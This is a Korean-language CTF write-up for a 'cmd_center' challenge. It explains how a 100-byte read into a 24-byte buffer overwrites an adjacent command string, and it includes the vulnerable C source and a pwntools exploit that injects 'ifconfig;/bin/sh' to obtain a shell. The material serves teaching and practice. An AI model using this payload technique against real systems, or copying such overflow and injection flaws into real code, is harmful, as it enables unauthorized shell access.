## Concept

### Buffer Overflow

BOF(Buffer Overflow)는 프로그램이 버퍼에 데이터를 쓸 때 버퍼의 크기를 초과하여 인접한 메모리 영역을 덮어쓸 수 있는 취약점이다. 이 문제에서는 Return Address를 덮어쓰는 대신, **인접한 다른 변수의 값을 조작**하는 데이터 변조 방식으로 활용한다.

### Command Injection

Command Injection은 프로그램이 사용자 입력을 검증 없이 시스템 명령어에 포함시킬 때, 공격자가 `;`, `|`, `&&` 같은 셸 구분자를 삽입하여 의도하지 않은 명령어를 추가로 실행시키는 취약점이다.

```
system("ifconfig;/bin/sh")
         ^^^^^^^^  ^^^^^^^^
         정상 명령  공격자가 주입한 명령
```

세미콜론(`;`)은 앞 명령의 성공 여부와 관계없이 뒷 명령을 실행하므로, `ifconfig` 실행 후 `/bin/sh`가 이어서 실행된다.

## 문제

`cmd_injection` 문제는 BOF와 Command Injection을 조합하여 서버에서 셸을 획득하는 문제이다. 서버 연결이 불가하여 로컬 바이너리로 시뮬레이션을 진행했다.

### 서비스 분석

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int main()
{
    char cmd_ip[256] = "ifconfig";
    int dummy;
    char center_name[24];

    init();

    printf("Center name: ");
    read(0, center_name, 100);

    if( !strncmp(cmd_ip, "ifconfig", 8)) {
        system(cmd_ip);
    }
    else {
        printf("Something is wrong!\n");
    }
    exit(0);
}
```
{: file="cmd_center.c"}

취약점은 두 곳에 있다. 첫째로 `center_name`은 24바이트로 선언되어 있지만 `read(0, center_name, 100)`으로 100바이트까지 입력을 받아 BOF가 발생한다. 둘째로 `system(cmd_ip)`가 `cmd_ip`의 내용을 그대로 셸 명령어로 실행하기 때문에 `;` 구분자로 명령어를 추가 주입할 수 있다.

GDB로 `main`을 디스어셈블하면 스택에서 각 변수의 위치를 확인할 수 있다.

![disas](/assets/img/posts/cmdinject/disas.png)

```
center_name = [rbp-0x130]
cmd_ip      = [rbp-0x110]
```

두 변수 사이의 거리는 `0x130 - 0x110 = 0x20 = 32바이트`이다.

### 공격 전략

`center_name`에서 `cmd_ip` 시작 위치까지 BOF로 도달한 뒤, `cmd_ip`의 내용을 `ifconfig;/bin/sh`로 덮어쓴다. 이렇게 하면 `strncmp(cmd_ip, "ifconfig", 8)` 조건을 통과하면서 `system("ifconfig;/bin/sh")`가 실행되어 셸을 획득할 수 있다.

```
[ 낮은 주소 ]
+------------------------------+
|  center_name (24byte)        |  <-- "A" * 24
+------------------------------+
|  dummy (8byte)               |  <-- "A" * 8  (center_name ~ cmd_ip 사이 패딩)
+------------------------------+
|  cmd_ip (256byte)            |  <-- "ifconfig;/bin/sh\x00"
|  (원래 "ifconfig"로 초기화)  |
+------------------------------+
[ 높은 주소 ]
```

`strncmp`는 앞 8바이트만 비교하므로 `ifconfig` 뒤에 `;/bin/sh`를 붙여도 조건을 통과한다.

### 익스플로잇

```python
from pwn import *

p = process('./cmd_center')

payload  = b"A" * 24           # center_name 채우기
payload += b"A" * 8            # dummy 채우기 (cmd_ip까지 오프셋 32바이트)
payload += b"ifconfig;/bin/sh" # cmd_ip 덮어쓰기

p.sendafter(b"Center name: ", payload)

p.interactive()
```
